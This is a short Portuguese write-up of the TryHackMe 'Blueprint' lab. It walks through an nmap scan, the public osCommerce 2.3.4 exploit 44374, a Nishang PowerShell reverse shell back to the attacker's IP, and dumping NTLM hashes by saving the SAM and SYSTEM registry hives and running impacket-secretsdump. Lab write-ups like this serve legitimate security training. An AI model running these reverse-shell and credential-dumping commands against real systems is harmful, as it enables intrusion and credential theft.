Blueprint

TryHackMe · Easy by Brenno M.

Blueprint explora uma RCE no osCommerce 2.3.4 (install script exposto) para obter execução de comandos como SYSTEM em um host Windows/XAMPP e, então, extrai os hashes locais com o secretsdump.

Reconhecimento

O Nmap revela IIS, Apache/PHP (8080), SMB e MySQL. Em 8080 roda o osCommerce 2.3.4, com o exploit público 44374.

nmap -sS -sV -Pn <IP>
searchsploit osCommerce 2.3.4
searchsploit -m 44374

Exploração

O exploit injeta código no install.php e permite comandos via parâmetro. Hospeda-se uma reverse shell PowerShell (Nishang) e obtém-se shell, no XAMPP, já como privilegiado.

python3 44374.py   # (base_url e target_url configurados)
# Invoke-PowerShellTcp -Reverse -IPAddress <MEU_IP> -Port 4444

Pós-exploração - secretsdump

Salvam-se as colmeias SAM e SYSTEM do registro, baixam-se e extraem-se os hashes NTLM localmente com o Impacket secretsdump (o hash pode então ser quebrado offline).

reg save hklm\sam sam.bak
reg save hklm\system system.bak
# baixar sam.bak / system.bak
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
# hash NTLM do Administrator: <HASH_OMITIDO>  (quebrar offline)
